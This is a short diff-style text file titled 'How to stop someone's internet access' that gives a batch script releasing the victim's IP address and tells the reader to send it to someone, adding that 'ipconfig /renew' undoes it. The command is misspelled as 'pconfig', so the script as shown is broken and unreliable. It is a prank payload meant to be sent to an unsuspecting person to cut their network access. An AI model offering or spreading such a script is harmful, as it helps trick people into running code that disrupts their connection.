@@ -1,0 +1,9 @@
+How to stop someone’s internet access
+@Echo off
+
+pconfig /release
+
+Save that as a .bat and send it to someone. They’re IP address will be lost, and therefore they won’t be able to fix it
+
+However, this is VERY easy to fix. Simply type in IPconfig /renew
+
